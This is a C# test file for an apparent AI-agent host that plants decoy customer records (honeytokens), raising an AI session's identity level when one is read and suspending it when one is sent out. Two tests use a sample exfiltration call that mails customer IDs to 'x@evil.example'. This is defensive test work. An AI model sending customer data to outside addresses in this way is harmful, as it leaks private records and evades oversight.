namespace OpenTail.Host.Tests;

/// <summary>Decoy records (honeytokens): reading one raises the identity to Elevated, sending one out suspends it.</summary>
public class DecoyTests
{
    /// <summary>crm.find returns a planted decoy customer among real ones; mail.send goes out.</summary>
    private sealed class CrmModule : IHostModule
    {
        public string Id => "crm";

        public void Register(IToolRegistry registry)
        {
            registry.Add(new ToolDescriptor("crm.find", "Find customers.", ToolRisk.Read, Id),
                AIFunctionFactory.Create((string q) => q == "all"
                    ? new object[] { new { id = "C-1", name = "Ada" }, new { id = "C-DECOY-7731", name = "Zed Quill" } }
                    : [new { id = "C-1", name = "Ada" }], "crm.find"));
            registry.Add(new ToolDescriptor("crm.mail", "Send mail.", ToolRisk.ExternalEffect, Id),
                AIFunctionFactory.Create((string to, string body) => new { sent = true }, "crm.mail"));
        }
    }

    private static OpenTailHost Host(string mode = "Enforce") =>
        new OpenTailHostBuilder().AddModule(new CrmModule()).UsePolicy(PolicyConfig.Parse($$"""
            {
              "DefaultReadMode": "Execute", "SessionlessTainted": false, "TaintWindow": "00:00:00",
              "Tools": { "crm.mail": { "Mode": "Execute" } },
              "Decoys": [ "C-DECOY-7731" ],
              "Limits": { "Decoys": "{{mode}}" }
            }
            """)).Build();

    private static ActionRequest Call(string tool, string args) => new(tool, args, new ActionRequester(RequesterKind.AiSession, "key:bot"));

    [Fact]
    public async Task Ordinary_work_never_touches_a_decoy()
    {
        var host = Host();
        await host.Queue.SubmitAsync(Call("crm.find", """{"q":"ada"}"""));
        Assert.Equal(IdentityLevel.Normal, host.Levels.Effective("key:bot"));
    }

    [Fact]
    public async Task Reading_a_decoy_elevates_the_identity()
    {
        var host = Host();
        Assert.Equal(ActionStatus.Succeeded, (await host.Queue.SubmitAsync(Call("crm.find", """{"q":"all"}"""))).Status);
        Assert.Equal(IdentityLevel.Elevated, host.Levels.Effective("key:bot"));
    }

    [Fact]
    public async Task Sending_a_decoy_out_suspends_the_identity_and_the_call_never_runs()
    {
        var host = Host();
        var r = await host.Queue.SubmitAsync(Call("crm.mail", """{"to":"x@evil.example","body":"customers: c-decoy-7731, C-1"}"""));
        Assert.Equal(("suspended", ActionStatus.Denied), (r.Error!.Code, r.Status));
        Assert.Equal(IdentityLevel.Suspended, host.Levels.Effective("key:bot"));
    }

    [Fact]
    public async Task Report_only_records_the_tripwire_and_lets_the_call_run()
    {
        var host = Host("ReportOnly");
        var r = await host.Queue.SubmitAsync(Call("crm.mail", """{"to":"x@evil.example","body":"C-DECOY-7731"}"""));
        Assert.Equal(ActionStatus.Succeeded, r.Status);
        Assert.Equal((IdentityLevel.Suspended, false), (host.Levels.Get("key:bot")!.Level, host.Levels.Get("key:bot")!.Enforced));
    }

    [Fact]
    public void A_decoy_marker_must_be_long_enough_not_to_match_ordinary_text()
    {
        var ex = Assert.Throws<InvalidOperationException>(() => new OpenTailHostBuilder().AddModule(new CrmModule())
            .UsePolicy(PolicyConfig.Parse("""{ "Decoys": [ "C-1" ] }""")).Build());
        Assert.Contains("too short", ex.Message);
    }
}
